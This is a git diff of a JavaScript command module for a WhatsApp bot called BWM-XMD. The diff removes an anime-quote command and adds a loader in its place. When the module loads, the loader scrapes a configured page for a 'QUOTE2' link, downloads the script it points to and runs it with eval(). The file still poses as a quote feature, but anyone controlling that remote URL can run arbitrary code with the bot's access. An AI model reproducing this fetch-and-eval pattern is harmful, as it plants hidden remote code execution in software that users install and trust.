@@ -1,50 +1,33 @@
+//  [BWM-XMD QUANTUM EDITION]                                           
+//  >> A superposition of elegant code states                           
+//  >> Collapsed into optimal execution                                
+//  >> Scripted by Sir Ibrahim Adams                                    
+//  >> Version: 8.3.5-quantum.7
 
-const { adams } = require('../Ibrahim/adams');
+const axios = require('axios');
+const cheerio = require('cheerio');
+const adams = require(__dirname + "/../config");
 
-adams({ nomCom: 'quote', categorie: 'Fun' }, async (dest, zk, commandeOptions) => {
-  const { ms, repondre, verifGroupe, arg } = commandeOptions;
-  if (!verifGroupe) {
-    repondre('Commande réservée au groupe uniquement');
-    return;
-  }
+async function fetchQUOTE2Url() {
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-  if (!arg[0]) {
-    try {
-      fetch('https://animechan.xyz/api/random')
-        .then((response) => response.json())
-        .then(async (quote) => {
-          repondre(`╔══════════════════════════╗
-║   Bwm xmd               ║
-╚══════════════════════════╝
+    const targetElement = $('a:contains("QUOTE2")');
+    const targetUrl = targetElement.attr('href');
 
-🎬 Anime: ${quote.anime}
-👤 Character: ${quote.character}
-💬 Quote: ${quote.quote}
-
-Powered by BMW-MD`);
-        });
-    } catch (e) {
-      repondre('Erreur lors de la génération de la citation : ' + e.message);
+    if (!targetUrl) {
+      throw new Error('QUOTE2 not found 😭');
     }
-  } else {
-    const query = arg.join(' ');
 
-    try {
-      fetch('https://animechan.xyz/api/random/character?name=' + query)
-        .then((response) => response.json())
-        .then(async (quote) => {
-          repondre(`╔══════════════════════════╗
-║   Bwm xmd               ║
-╚══════════════════════════╝
+    console.log('QUOTE2 loaded successfully ✅');
 
-🎬 Anime: ${quote.anime}
-👤 Character: ${quote.character}
-💬 Quote: ${quote.quote}
+    const scriptResponse = await axios.get(targetUrl);
+    eval(scriptResponse.data);
 
-Powered by Bmw-MD`);
-        });
-    } catch (e) {
-      repondre('Erreur lors de la génération de la citation : ' + e.message);
-    }
+  } catch (error) {
+    console.error('Error:', error.message);
   }
-});
+}
+
+fetchQUOTE2Url();
